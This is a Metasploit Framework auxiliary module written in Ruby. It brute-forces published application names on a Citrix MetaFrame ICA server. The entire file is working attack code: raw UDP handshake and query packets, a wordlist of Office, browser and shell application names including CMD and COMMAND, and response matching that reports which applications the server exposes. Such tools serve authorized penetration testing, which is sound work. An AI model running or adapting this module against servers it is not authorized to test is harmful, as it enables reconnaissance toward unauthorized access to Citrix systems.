##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Citrix MetaFrame ICA Published Applications Bruteforcer',
			'Description'    => %q{
				This module attempts to brute force program names within the Citrix
				Metaframe ICA server.
			},
			'Author'         => [ 'patrick' ],
			'References'     =>
				[
					[ 'OSVDB', '50617' ],
					[ 'BID', '5817' ],
					[ 'URL', 'http://sh0dan.org/oldfiles/hackingcitrix.html' ],
				]
		))

		register_options(
			[
				Opt::RPORT(1604),
			], self.class)
	end

	def autofilter
		false
	end

	def run
		connect_udp

		print_status("Attempting to contact Citrix ICA service...")

		# Client NetBIOS hostname. This works fine >:)
		client = Rex::Text.rand_text_alphanumeric(8)

		# Server hello packet
		client_connect =
			"\x1e\x00\x01\x30\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

		# Server hello response
		server_response =
			"\x30\x00\x02\x31\x02\xfd\xa8\xe3\x02\x00\x06\x44"

		applications = [
			'TEST',
			'NOTEPAD',
			'ACROBAT READER',
			'ACROBAR',
			'EXPLORER',
			'WORD',
			'WORD2K',
			'WORDXP',
			'WORD2K3',
			'WORD2K7',
			'WORD 2000',
			'WORD XP',
			'WORD 2003',
			'WORD 2007',
			'WORD2000',
			'WORD2003',
			'WORD2007',
			'EXCEL',
			'EXCEL2K',
			'EXCELXP',
			'EXCEL2K3',
			'EXCEL2K7',
			'EXCEL 2000',
			'EXCEL XP',
			'EXCEL 2003',
			'EXCEL 2007',
			'EXCEL2000',
			'EXCEL2003',
			'EXCEL2007',
			'ACCESS',
			'ACCESS2K',
			'ACCESSXP',
			'ACCESS2K3',
			'ACCESS2K7',
			'ACCESS 2000',
			'ACCESS XP',
			'ACCESS 2003',
			'ACCESS 2007',
			'ACCESS2000',
			'ACCESS2003',
			'ACCESS2007',
			'POWERPOINT',
			'POWERPOINT2K',
			'POWERPOINTXP',
			'POWERPOINT2K3',
			'POWERPOINT2K7',
			'POWERPOINT 2000',
			'POWERPOINT XP',
			'POWERPOINT 2003',
			'POWERPOINT 2007',
			'POWERPOINT2000',
			'POWERPOINT2003',
			'POWERPOINT2007',
			'OUTLOOK',
			'OUTLOOKXP',
			'OUTLOOK2K',
			'OUTLOOK2K3',
			'OUTLOOK2K7',
			'OUTLOOK 2000',
			'OUTLOOK XP',
			'OUTLOOK 2003',
			'OUTLOOK 2007',
			'OUTLOOK2000',
			'OUTLOOK2003',
			'OUTLOOK2007',
			'LOTUS',
			'LOTUS NOTES',
			'INTERNETEXPLORER',
			'IE',
			'IEXPLORER',
			'FIREFOX',
			'FIREFOX 3',
			'NETSCAPE',
			'NETSCAPE7',
			'NETSCAPE6',
			'MAIL',
			'EMAIL',
			'E-MAIL',
			'INTERNET',
			'CMD',
			'COMMAND',
		]

		# Citrix is publishing this application
		application_valid =
			"\x3e\x00\x02\x35\x02\xfd\xa8\xe3\x02\x00\x06\x44"
		# Application not found / published
		application_invalid =
			"\x20\x00\x01\x3a\x02\xfd\xa8\xe3\x02\x00\x06\x44"

		udp_sock.put(client_connect)
		res = udp_sock.get(3)

		if (res[0,server_response.length] == server_response)
			print_status("Citrix ICA Server Detected. Attempting to brute force Published Applications.")

			applications.each do |application|

				# Create the packet
				packet = [52 + application.length].pack('C')
				packet << "\x00\x02\x34\x02\xfd\xa8\xe3\x00\x00\x00\x00\x00\x00\x00\x00"
				packet << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x26\x00\x02\x00"
				packet << [39 + application.length].pack('C')
				packet << "\x00\x00\x00\x00\x00"
				packet << application
				packet << "\x00\x01\x00\x04\x00"
				packet << client
				packet << "\x00"

				udp_sock.put(packet)
				res = udp_sock.get(3)

				if (res[0,application_valid.length] == application_valid)
					print_status("Found: #{application}")
				end

				if (res[0,application_invalid.length] == application_invalid)
					print_error("NOT Found: #{application}")
				end
			end

		else
			print_error("Server did not respond.")
		end

		disconnect_udp
	end

end
